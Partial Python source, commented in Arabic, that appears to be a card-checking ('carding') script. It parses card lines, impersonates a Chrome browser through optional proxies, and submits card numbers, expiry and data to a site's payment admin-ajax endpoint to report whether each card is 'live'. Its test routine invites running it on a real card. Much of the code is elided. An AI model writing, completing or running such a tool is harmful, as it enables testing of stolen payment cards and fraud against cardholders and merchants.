...
class tools:
    ...
    def getcard(card: str) -> dict:
        ...
        # 🔥 التعديل الوحيد: تحويل السنة إلى 4 أرقام (مثل 25 -> 2025)
        if len(yy) == 2:
            yy = "20" + yy
        elif len(yy) == 4:
            yy = yy
        # إذا كانت السنة بصيغة أخرى، نتركها كما هي
    ...
    async def charge_card(card_data: dict, user_data: dict, proxies: dict = None) -> tuple[str, str, bool]:
        ...
        async with AsyncSession(impersonate="chrome139", proxies=proxies) as session:
            try:
                ...
                # ----- 2. POST to admin-ajax (first call) -----
                headers_ajax1 = {
                ...
                params_nonce = {
                    "_": "1774672911370.7332",  # قيمة ثابتة (مثل الأصل)
                    "version": "1.83.0",
                }
                json_nonce = {
                    "analytics": {
                    ...
                    "card_data": {
                        ...
                        "exp_year": int(card_data["yy"]),   # أصبحت 4 أرقام
                        "number": card_data["cc"],
                    },
                    "pow_counter": var,
                }
...
# ================== الدالة الرئيسية الاختبارية =================
async def main():
    # مثال لبطاقة (ضع بطاقة حقيقية للاختبار، لكن هنا مجرد مثال)
    card_line = "4111111111111111|12|26|123"
    
    # تشغيل العملية
    status, message, is_live = await process_SQ_1_charge(card_line)
